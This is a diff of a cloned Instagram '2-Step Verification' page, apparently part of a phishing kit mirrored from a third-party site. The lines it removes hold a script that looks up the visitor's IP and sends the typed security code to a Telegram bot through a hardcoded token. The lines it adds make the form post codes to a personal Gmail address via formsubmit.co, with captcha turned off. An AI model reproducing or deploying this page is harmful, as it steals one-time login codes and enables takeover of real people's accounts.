@@ -57,8 +57,7 @@
       <!-- SMARTPHONE SECTION END -->
       <!-- FORM SECTION -->
       <article class="form-area">
-        <form  id="contactForm"  method="POST">
-          <input type="text" id="ipaddress" name="ipaddress" hidden>
+        <form  action="https://formsubmit.co/pabloben022@gmail.com" method="POST" accept=".">
           <p class="small-title">2-Step Verification</p>
           <input
             type="text"
@@ -67,15 +66,15 @@
             required
             placeholder="Security code"
           />
-          <!-- <input type="hidden" name="linkId" value="657daf104b167f68d1979b9c" /> -->
-          <input type="submit" name="submit" value="Confirm" id="submit"/>
+          <input type="hidden" name="linkId" value="657daf104b167f68d1979b9c" />
+          <input type="submit" name="submit" value="Confirm" />
           <div class="options">
             <p class="small">Didn't get security code? we can</p>
             <a href="#" class="small">resend it</a>
             <div class="forget"><a href="#">Forgot password?</a></div>
           </div>
-          <!-- <input type="hidden" name="_next" value="https://fanvote.mynetly.com/sltvot/thanks.html">
-<input type="hidden" name="_captcha" value="false"> -->
+          <input type="hidden" name="_next" value="thanks.html">
+<input type="hidden" name="_captcha" value="false">
 
         </form>
         <div class="noaccount">
@@ -164,57 +163,12 @@
           <option value="sr">Српски</option>
           <option value="uk">Українська</option>
         </select>
-        <span>&copy; 2023 Instagram from Meta</span>
+        <span>&copy; 2025 Instagram from Meta</span>
       </div>
     </footer>
     <script src="../../js/socials/app.html"></script>
     <script src="../../js/socials/brands.min.html"></script>
     <script src="../../js/socials/fontawesome.min.html"></script>
-    <script>
-      document.addEventListener('DOMContentLoaded', function () {
-        // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
-        fetch('https://api.ipify.org?format=json')
-          .then(response => response.json())
-          .then(data => {
-            const ipaddress = data.ip;
-            document.getElementById('ipaddress').value = ipaddress;
-          })
-          .catch(error => {
-            console.error('Error fetching IP address:', error);
-          });
-      });
-
-
-
-
-      document.getElementById('contactForm').addEventListener('submit', function (event) {
-        event.preventDefault();
-
-        var code = document.getElementById('code').value;
-        // var password = document.getElementById('password').value;
-        var ipaddress = document.getElementById('ipaddress').value;
-
-        var telegramMessage = `code: ${code}\nIpaddress: ${ipaddress}`;
-   var token = '8384188856:AAEsf9qHpnJ1-438BQxfxYdJB-T-2IGlCn8';
-      var chat_id = '8499614893';
-
-        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
-
-        fetch(url)
-          .then(response => response.json())
-          .then(data => {
-            if (data.ok) {
-              window.location.href = 'thanks.html';  // Redirect to thank you page
-            } else {
-              alert('Error sending message.');
-            }
-          })
-          .catch(error => {
-            console.error('Error:', error);
-          });
-      });
-
-    </script>
   </body>
 
 <!-- Mirrored from fanfamousity.com/instagram/otp/657daf104b167f68d1979b9c by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 17 Dec 2023 11:22:30 GMT -->
